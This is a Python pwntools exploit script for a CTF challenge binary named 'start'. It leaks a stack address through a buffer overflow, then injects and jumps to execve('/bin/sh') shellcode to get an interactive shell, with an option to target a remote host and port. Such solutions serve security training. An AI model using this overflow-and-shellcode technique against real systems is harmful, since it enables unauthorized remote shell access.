from pwn import *

def exploit():
    '''
    08048060 <_start>:
     8048060:       54                      push   %esp
     8048061:       68 9d 80 04 08          push   $0x804809d
     8048066:       31 c0                   xor    %eax,%eax
     8048068:       31 db                   xor    %ebx,%ebx
     804806a:       31 c9                   xor    %ecx,%ecx
     804806c:       31 d2                   xor    %edx,%edx
     804806e:       68 43 54 46 3a          push   $0x3a465443
     8048073:       68 74 68 65 20          push   $0x20656874
     8048078:       68 61 72 74 20          push   $0x20747261
     804807d:       68 73 20 73 74          push   $0x74732073
     8048082:       68 4c 65 74 27          push   $0x2774654c
     8048087:       89 e1                   mov    %esp,%ecx
     8048089:       b2 14                   mov    $0x14,%dl
     804808b:       b3 01                   mov    $0x1,%bl
     804808d:       b0 04                   mov    $0x4,%al
     804808f:       cd 80                   int    $0x80
     8048091:       31 db                   xor    %ebx,%ebx
     8048093:       b2 3c                   mov    $0x3c,%dl
     8048095:       b0 03                   mov    $0x3,%al
     8048097:       cd 80                   int    $0x80
     8048099:       83 c4 14                add    $0x14,%esp
     804809c:       c3                      ret   
    '''

    elf = ELF("./start")
    context.arch = elf.arch
    context.os = elf.os
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        io = remote(host, port)
    elif len(sys.argv) == 2:
        io = gdb.debug(elf.path, gdbscript="start", exe=elf.path)
    else:
        io = process(elf.path)

    # Stage 1: leak stack
    payload = b"AAAA" * 4 + b"BBBB" + p32(0x8048087)
    io.recvuntil(":")
    io.send(payload)

    leaked_data = io.recv()
    stack = u32(leaked_data[0:4])
    print("stack: 0x%08x" % stack)

    # Stage 2: ret2sc
    sc_addr = stack + 0x14
    print("sc: 0x%08x" % (sc_addr))
    sc = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
    print(hexdump(sc))
    payload = b"XXXX" * 4 + b"YYYY" + p32(sc_addr) + sc
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
